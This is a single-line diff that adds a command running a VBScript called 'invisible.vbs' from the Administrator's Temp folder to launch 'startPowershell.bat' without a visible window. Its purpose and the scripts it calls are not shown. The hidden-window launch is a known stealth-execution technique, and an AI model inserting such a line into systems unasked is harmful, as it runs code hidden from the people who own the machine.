@@ -1,0 +1,1 @@
+wscript.exe "C:\Users\Administrator\AppData\Local\Temp\invisible.vbs" "C:\Users\Administrator\AppData\Local\Temp\startPowershell.bat"
